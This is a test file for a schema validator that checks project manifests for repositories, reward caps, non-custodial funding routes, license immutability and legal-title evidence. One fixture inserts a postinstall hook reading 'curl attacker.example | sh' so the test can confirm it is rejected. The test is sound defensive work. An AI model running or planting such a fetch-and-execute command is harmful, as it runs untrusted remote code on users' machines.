/** Tests pull-request project manifests and registry-wide collision rejection. */

import { describe, expect, it } from "vitest";
import deltaStar from "../../projects/delta-star/project.json";
import eliza from "../../projects/eliza/project.json";
import heirElements from "../../projects/heir-elements-sdk/project.json";
import {
  assertProjectDefinition,
  assertProjectRegistry,
} from "./project-schema.mjs";

interface MutablePolicyFixture {
  authority: unknown;
  steward: { kind: string };
  terms: {
    assignment: unknown;
    copyright: { claimedLegalHolder: string | null; model: string };
    externalPrize: { rulesSha256: string | null };
  };
}

function mutablePolicyFixture(value: unknown): MutablePolicyFixture {
  return structuredClone(value) as MutablePolicyFixture;
}

describe("project proposal schema", () => {
  it("accepts the two launch folders as complete self-contained definitions", () => {
    expect(assertProjectRegistry([eliza, deltaStar])).toHaveLength(2);
    expect(assertProjectDefinition(eliza).reviewSkill.id).toBe(
      "review-eliza-contributions",
    );
  });

  it("rejects executable extras, identity mismatch, and fake commitment", () => {
    const executable = structuredClone(eliza) as Record<string, unknown>;
    executable.postinstall = "curl attacker.example | sh";
    expect(() => assertProjectDefinition(executable)).toThrow(/unexpected/u);

    const mismatched = structuredClone(eliza);
    mismatched.repositories[0].githubUrl = "https://github.com/attacker/repo";
    expect(() => assertProjectDefinition(mismatched)).toThrow(
      /does not match/u,
    );

    const fakeCommitment = structuredClone(eliza);
    fakeCommitment.reward.committedMinor = "1000000";
    expect(() => assertProjectDefinition(fakeCommitment)).toThrow(
      /inconsistent/u,
    );

    const fakeEnable = structuredClone(eliza);
    fakeEnable.reward.paymentMode = "enabled";
    expect(() => assertProjectDefinition(fakeEnable)).toThrow(/inconsistent/u);

    const misleadingCap = structuredClone(eliza);
    misleadingCap.reward.monthlyCapDisplay = "$100,000,000";
    expect(() => assertProjectDefinition(misleadingCap)).toThrow(
      /inconsistent/u,
    );

    const overlargeCap = structuredClone(eliza);
    overlargeCap.reward.monthlyCapMinor = "1000000000000001";
    expect(() => assertProjectDefinition(overlargeCap)).toThrow(/at most/u);
  });

  it("rejects repository and skill collisions across project folders", () => {
    const copy = structuredClone(deltaStar);
    copy.repositories[0] = structuredClone(eliza.repositories[0]);
    copy.terms.repositoryLicense = structuredClone(
      eliza.terms.repositoryLicense,
    );
    expect(() => assertProjectRegistry([eliza, copy])).toThrow(
      /duplicate repositories/u,
    );
  });

  it("requires disclosure without restricting the declared model", () => {
    expect(assertProjectDefinition(eliza).modelPolicy).toEqual({
      mode: "open-declared",
      disclosureRequired: true,
    });
    const gated = structuredClone(eliza);
    gated.modelPolicy = {
      mode: "frontier-only",
      approved: [{ client: "codex", provider: "openai", model: "example" }],
    } as never;
    expect(() => assertProjectDefinition(gated)).toThrow(
      /unexpected|declared model/u,
    );
  });

  it("keeps direct funding non-custodial and rejects ambiguous routes", () => {
    expect(assertProjectDefinition(eliza).funding).toMatchObject({
      mode: "direct-noncustodial",
      addresses: [],
    });
    const alteredDisclosure = structuredClone(eliza);
    alteredDisclosure.funding.disclosure = "Slop holds the funds." as never;
    expect(() => assertProjectDefinition(alteredDisclosure)).toThrow(
      /non-custodial/u,
    );

    const duplicate = structuredClone(eliza);
    duplicate.funding.addresses = [
      {
        network: "solana",
        asset: "USDC",
        address: "11111111111111111111111111111111",
        effectiveAt: "2026-08-16T00:00:00.000Z",
        replacedAt: null,
      },
      {
        network: "solana",
        asset: "USDC",
        address: "Vote111111111111111111111111111111111111111",
        effectiveAt: "2026-08-17T00:00:00.000Z",
        replacedAt: null,
      },
    ] as never;
    expect(() => assertProjectDefinition(duplicate)).toThrow(
      /duplicate route/u,
    );

    const invalidSolana = structuredClone(eliza);
    invalidSolana.funding.addresses = [
      {
        network: "solana",
        asset: "USDC",
        address: "2".repeat(32),
        effectiveAt: "2026-08-16T00:00:00.000Z",
        replacedAt: null,
      },
    ] as never;
    expect(() => assertProjectDefinition(invalidSolana)).toThrow(
      /address is invalid/u,
    );
  });

  it("fails closed on inferred or mutable project authority", () => {
    const activeWithoutProof = structuredClone(eliza);
    activeWithoutProof.status = "active";
    expect(() => assertProjectDefinition(activeWithoutProof)).toThrow(
      /verified repository authority/u,
    );

    const loginAsIdentity = structuredClone(eliza);
    loginAsIdentity.steward.github.actorId = "elizaOS";
    expect(() => assertProjectDefinition(loginAsIdentity)).toThrow(/actorId/u);

    const mutableLicense = structuredClone(eliza);
    mutableLicense.terms.repositoryLicense.url =
      "https://github.com/elizaOS/eliza/blob/develop/LICENSE";
    expect(() => assertProjectDefinition(mutableLicense)).toThrow(/immutable/u);

    const mismatchedInbound = structuredClone(eliza) as unknown as {
      terms: {
        inbound: {
          mode: string;
          termsUrl: string | null;
          commitSha: string | null;
          fileSha256: string | null;
          version: string | null;
          acceptance: string | null;
        };
      };
    };
    mismatchedInbound.terms.inbound = {
      mode: "cla",
      termsUrl: `https://github.com/elizaOS/eliza/blob/${"b".repeat(40)}/CLA.md`,
      commitSha: "a".repeat(40),
      fileSha256: "c".repeat(64),
      version: "1",
      acceptance: "Signed before contribution",
    };
    expect(() => assertProjectDefinition(mismatchedInbound)).toThrow(
      /bind its repository, commit/u,
    );

    const fakeProof = mutablePolicyFixture(eliza);
    fakeProof.authority = {
      state: "verified",
      reason: null,
      role: "project-steward",
      repositoryId: eliza.authority.repositoryId,
      repositoryNodeId: eliza.authority.repositoryNodeId,
      proof: {
        url: "https://github.com/elizaOS/eliza/blob/develop/.github/slop-project.json",
        commitSha: "a".repeat(40),
        fileSha256: "b".repeat(64),
        policyRevision: eliza.terms.revision,
        verifiedAt: "2026-08-16T00:00:00.000Z",
      },
    };
    expect(() => assertProjectDefinition(fakeProof)).toThrow(/immutable/u);
  });

  it("requires signed legal evidence for sponsor and DAO title claims", () => {
    const sponsor = mutablePolicyFixture(eliza);
    sponsor.terms.copyright.model = "sponsor-owned";
    sponsor.terms.copyright.claimedLegalHolder = "Example Research, Inc.";
    expect(() => assertProjectDefinition(sponsor)).toThrow(
      /signed assignment/u,
    );

    const contributorRetained = mutablePolicyFixture(eliza);
    contributorRetained.terms.copyright.model = "contributor-retained";
    contributorRetained.terms.copyright.claimedLegalHolder = "Sponsor, Inc.";
    expect(() => assertProjectDefinition(contributorRetained)).toThrow(
      /forbid/u,
    );

    const dao = mutablePolicyFixture(eliza);
    dao.steward.kind = "dao";
    dao.terms.copyright.model = "sponsor-owned";
    dao.terms.copyright.claimedLegalHolder = "Example DAO";
    dao.terms.assignment = {
      assignee: "Example DAO",
      instrumentUrl: "https://example.com/assignment.pdf",
      version: "1",
      fileSha256: "a".repeat(64),
      signedAt: "2026-08-16T00:00:00.000Z",
    };
    expect(() => assertProjectDefinition(dao)).toThrow(/legal capacity/u);
  });

  it("keeps external prize rules outside platform settlement", () => {
    expect(deltaStar.reward.paymentMode).toBe("disabled");
    expect(deltaStar.terms.externalPrize?.allocationAuthority).toMatch(
      /author-approved/u,
    );
    const inventedCapture = mutablePolicyFixture(deltaStar);
    inventedCapture.terms.externalPrize.rulesSha256 = "a".repeat(64);
    expect(() => assertProjectDefinition(inventedCapture)).toThrow(
      /unverified rules/u,
    );
  });

  it("represents a missing repository license as unknown and paused", () => {
    expect(assertProjectDefinition(heirElements).status).toBe("paused");
    expect(heirElements.terms.repositoryLicense).toEqual({
      state: "unknown",
      spdx: null,
      url: null,
      commitSha: null,
      fileSha256: null,
    });
    const active = structuredClone(heirElements);
    active.status = "active";
    expect(() => assertProjectDefinition(active)).toThrow(
      /verified repository authority/u,
    );
  });
});
